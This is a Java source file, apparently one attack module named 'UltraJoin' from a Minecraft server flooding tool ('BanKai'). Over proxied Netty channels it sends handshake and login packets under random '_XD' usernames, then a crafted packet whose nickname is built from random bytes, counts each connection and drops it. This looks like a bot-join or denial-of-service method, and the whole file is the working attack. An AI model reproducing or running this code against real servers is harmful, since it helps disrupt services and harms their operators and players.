package dev.xdmeow.core.methods.impl;

import java.io.IOException;
import java.nio.charset.Charset;
import java.util.Random;

import dev.xdmeow.BanKai;
import dev.xdmeow.core.NettyBootstrap;
import dev.xdmeow.core.methods.IMethod;
import dev.xdmeow.core.util.helper.RandomUtils;
import dev.xdmeow.core.util.mcutil.ext.Handshake;
import dev.xdmeow.core.util.mcutil.ext.LoginRequest;
import dev.xdmeow.core.util.proxy.Proxy;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class UltraJoin implements IMethod{

    private byte[] handshake = new Handshake(BanKai.protocol, BanKai.srvRecord, BanKai.port, 2).getWrappedPacket();
    String lol;
    final int a;

    public UltraJoin() {
        this.a = Integer.parseInt(System.getProperty("len", "25555"));
        byte[] array = new byte[14];
        (new Random()).nextBytes(array);
        String generatedString = new String(array, Charset.forName("UTF-8"));
        this.lol = generatedString;
      }
      
    @Override
    public void accept(Channel channel, Proxy proxy) {
        ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(RandomUtils.randomString(6)+"_XD")).getWrappedPacket()));
      String nick = this.lol+"_XD";
      out.write(nick.length() + 2);
      out.write(0);
      out.write(nick.length());
      out.writeBytes(nick);
      out.close();
    }
    catch (IOException e) {
      e.printStackTrace();
    }
    channel.writeAndFlush(b);
    ++NettyBootstrap.currentConnections;
    ++NettyBootstrap.totalConnections;
    channel.close();
    }
    
}
